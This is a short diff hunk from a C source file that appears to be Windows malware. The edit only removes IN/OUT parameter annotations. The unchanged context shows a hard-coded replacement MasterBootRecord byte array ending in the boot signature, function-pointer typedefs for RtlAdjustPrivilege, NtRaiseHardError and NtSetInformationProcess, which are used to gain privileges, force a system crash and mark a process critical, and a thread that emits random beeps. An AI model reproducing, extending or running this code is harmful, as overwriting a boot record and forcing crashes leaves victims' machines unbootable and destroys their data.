@@ -36,11 +36,11 @@ const BYTE MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E
 0x36, 0x39, 0x34, 0x32, 0x30, 0x69, 0x73, 0x6D, 0x79, 0x66, 0x61, 0x76, 0x65, 0x6E, 0x75, 0x6D,
 0x62, 0x65, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };
 
-typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(IN ULONG Privilege, IN BOOLEAN Enable, IN BOOLEAN CurrentThread, OUT PBOOLEAN Enabled);
-typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(IN NTSTATUS ErrorStatus, IN ULONG NumberOfParameters, IN ULONG UnicodeStringParameterMask, IN PULONG_PTR *Parameters, IN ULONG ValidResponseOption, OUT PULONG Response);
-typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(IN HANDLE hProcess, IN ULONG ulClassInfo, IN PVOID pProcessInformation, IN ULONG pProcessInformationSize);
+typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);
 
-DWORD WINAPI audio(IN LPVOID lpParam) {
+DWORD WINAPI audio(LPVOID lpParam) {
     while (true) {
         Sleep(rand() % 10000);
         Beep(rand() % 2000, rand() % 5000);
